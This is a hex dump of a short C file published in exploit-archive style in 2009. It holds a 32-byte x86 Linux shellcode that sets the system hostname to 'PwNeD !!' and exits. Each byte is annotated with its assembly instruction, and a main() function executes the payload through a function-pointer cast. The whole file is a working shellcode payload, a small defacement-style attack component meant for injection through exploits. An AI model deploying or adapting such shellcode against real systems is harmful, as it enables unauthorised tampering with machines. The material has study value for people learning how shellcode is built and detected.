00000000  2f 2a 0a 54 69 74 6c 65  20 20 3a 20 73 65 74 68  |/*.Title  : seth|
00000010  6f 73 74 6e 61 6d 65 20  22 70 77 6e 65 64 20 21  |ostname "pwned !|
00000020  21 22 0a 4e 61 6d 65 20  20 20 3a 20 33 32 20 62  |!".Name   : 32 b|
00000030  79 74 65 73 20 73 79 73  5f 73 65 74 68 6f 73 74  |ytes sys_sethost|
00000040  6e 61 6d 65 28 22 50 77  4e 65 44 20 21 21 22 2c  |name("PwNeD !!",|
00000050  38 29 20 78 38 36 20 6c  69 6e 75 78 20 73 68 65  |8) x86 linux she|
00000060  6c 6c 63 6f 64 65 0a 44  61 74 65 20 20 20 3a 20  |llcode.Date   : |
00000070  6d 61 79 2c 20 33 31 20  32 30 30 39 0a 41 75 74  |may, 31 2009.Aut|
00000080  68 6f 72 20 3a 20 67 75  6e 73 6c 69 6e 67 65 72  |hor : gunslinger|
00000090  5f 20 3c 79 75 64 68 61  2e 67 75 6e 73 6c 69 6e  |_ <yudha.gunslin|
000000a0  67 65 72 5b 61 74 5d 67  6d 61 69 6c 2e 63 6f 6d  |ger[at]gmail.com|
000000b0  3e 0a 57 65 62 20 20 20  20 3a 20 64 65 76 69 6c  |>.Web    : devil|
000000c0  7a 63 30 64 65 2e 63 6f  6d 0a 62 6c 6f 67 20 20  |zc0de.com.blog  |
000000d0  20 3a 20 67 75 6e 73 6c  69 6e 67 65 72 63 30 64  | : gunslingerc0d|
000000e0  65 2e 77 6f 72 64 70 72  65 73 73 2e 63 6f 6d 0a  |e.wordpress.com.|
000000f0  74 65 73 74 65 64 20 6f  6e 20 3a 20 6c 69 6e 75  |tested on : linu|
00000100  78 20 64 65 62 69 61 6e  0a 2a 2f 0a 0a 23 69 6e  |x debian.*/..#in|
00000110  63 6c 75 64 65 20 3c 73  74 64 69 6f 2e 68 3e 0a  |clude <stdio.h>.|
00000120  0a 63 68 61 72 20 2a 73  68 65 6c 6c 63 6f 64 65  |.char *shellcode|
00000130  3d 0a 20 22 5c 78 65 62  5c 78 31 31 22 20 20 20  |=. "\xeb\x11"   |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000150  20 2f 2a 20 6a 6d 70 20  20 20 20 30 78 38 30 34  | /* jmp    0x804|
00000160  38 30 37 33 20 2a 2f 0a  20 22 5c 78 33 31 5c 78  |8073 */. "\x31\x|
00000170  63 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c0"             |
00000180  20 20 20 20 20 20 20 2f  2a 20 78 6f 72 20 20 20  |       /* xor   |
00000190  20 25 65 61 78 2c 25 65  61 78 20 2a 2f 0a 20 22  | %eax,%eax */. "|
000001a0  5c 78 62 30 5c 78 34 61  22 20 20 20 20 20 20 20  |\xb0\x4a"       |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
000001c0  6d 6f 76 20 20 20 20 24  30 78 34 61 2c 25 61 6c  |mov    $0x4a,%al|
000001d0  20 2a 2f 0a 20 22 5c 78  35 62 22 20 20 20 20 20  | */. "\x5b"     |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001f0  20 20 20 2f 2a 20 70 6f  70 20 20 20 20 25 65 62  |   /* pop    %eb|
00000200  78 20 2a 2f 0a 20 22 5c  78 62 31 5c 78 30 38 22  |x */. "\xb1\x08"|
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000220  20 20 20 20 2f 2a 20 6d  6f 76 20 20 20 20 24 30  |    /* mov    $0|
00000230  78 38 2c 25 63 6c 20 2a  2f 0a 20 22 5c 78 63 64  |x8,%cl */. "\xcd|
00000240  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000250  20 20 20 20 20 20 20 20  20 2f 2a 20 69 6e 74 20  |         /* int |
00000260  20 20 20 24 30 78 38 30  20 2a 2f 0a 20 22 5c 78  |   $0x80 */. "\x|
00000270  33 31 5c 78 63 30 22 20  20 20 20 20 20 20 20 20  |31\xc0"         |
00000280  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 78 6f  |           /* xo|
00000290  72 20 20 20 20 25 65 61  78 2c 25 65 61 78 20 2a  |r    %eax,%eax *|
000002a0  2f 0a 20 22 5c 78 62 30  5c 78 30 31 22 20 20 20  |/. "\xb0\x01"   |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002c0  20 2f 2a 20 6d 6f 76 20  20 20 20 24 30 78 31 2c  | /* mov    $0x1,|
000002d0  25 61 6c 20 2a 2f 0a 20  22 5c 78 33 31 5c 78 64  |%al */. "\x31\xd|
000002e0  62 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b"              |
000002f0  20 20 20 20 20 20 2f 2a  20 78 6f 72 20 20 20 20  |      /* xor    |
00000300  25 65 62 78 2c 25 65 62  78 20 2a 2f 0a 20 22 5c  |%ebx,%ebx */. "\|
00000310  78 63 64 5c 78 38 30 22  20 20 20 20 20 20 20 20  |xcd\x80"        |
00000320  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 69  |            /* i|
00000330  6e 74 20 20 20 20 24 30  78 38 30 20 2a 2f 0a 20  |nt    $0x80 */. |
00000340  22 5c 78 65 38 5c 78 65  61 5c 78 66 66 5c 78 66  |"\xe8\xea\xff\xf|
00000350  66 5c 78 66 66 22 20 20  20 20 20 20 20 20 2f 2a  |f\xff"        /*|
00000360  20 63 61 6c 6c 20 20 20  30 78 38 30 34 38 30 36  | call   0x804806|
00000370  32 20 2a 2f 0a 20 22 5c  78 35 30 22 20 20 20 20  |2 */. "\x50"    |
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000390  20 20 20 20 2f 2a 20 70  75 73 68 20 20 20 25 65  |    /* push   %e|
000003a0  61 78 20 2a 2f 0a 20 22  5c 78 37 37 5c 78 34 65  |ax */. "\x77\x4e|
000003b0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000003c0  20 20 20 20 20 2f 2a 20  6a 61 20 20 20 20 20 30  |     /* ja     0|
000003d0  78 38 30 34 38 30 63 39  20 2a 2f 0a 20 22 5c 78  |x80480c9 */. "\x|
000003e0  36 35 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |65"             |
000003f0  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 67 73  |           /* gs|
00000400  20 2a 2f 0a 20 22 5c 78  34 34 22 20 20 20 20 20  | */. "\x44"     |
00000410  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000420  20 20 20 2f 2a 20 69 6e  63 20 20 20 20 25 65 73  |   /* inc    %es|
00000430  70 20 2a 2f 0a 20 22 5c  78 32 30 5c 78 32 31 22  |p */. "\x20\x21"|
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000450  20 20 20 20 2f 2a 20 61  6e 64 20 20 20 20 25 61  |    /* and    %a|
00000460  68 2c 28 25 65 63 78 29  20 2a 2f 0a 20 22 5c 78  |h,(%ecx) */. "\x|
00000470  32 31 22 3b 20 20 20 20  20 20 20 20 20 20 20 20  |21";            |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 2e  |            /* .|
00000490  62 79 74 65 20 30 78 32  31 20 2a 2f 0a 0a 69 6e  |byte 0x21 */..in|
000004a0  74 20 6d 61 69 6e 28 76  6f 69 64 29 0a 7b 0a 09  |t main(void).{..|
000004b0  09 66 70 72 69 6e 74 66  28 73 74 64 6f 75 74 2c  |.fprintf(stdout,|
000004c0  22 4c 65 6e 67 74 68 3a  20 25 64 5c 6e 22 2c 73  |"Length: %d\n",s|
000004d0  74 72 6c 65 6e 28 73 68  65 6c 6c 63 6f 64 65 29  |trlen(shellcode)|
000004e0  29 3b 0a 09 09 28 28 76  6f 69 64 20 28 2a 29 28  |);...((void (*)(|
000004f0  76 6f 69 64 29 29 20 73  68 65 6c 6c 63 6f 64 65  |void)) shellcode|
00000500  29 28 29 3b 0a 09 09 72  65 74 75 72 6e 20 30 3b  |)();...return 0;|
00000510  0a 7d                                             |.}|
00000512
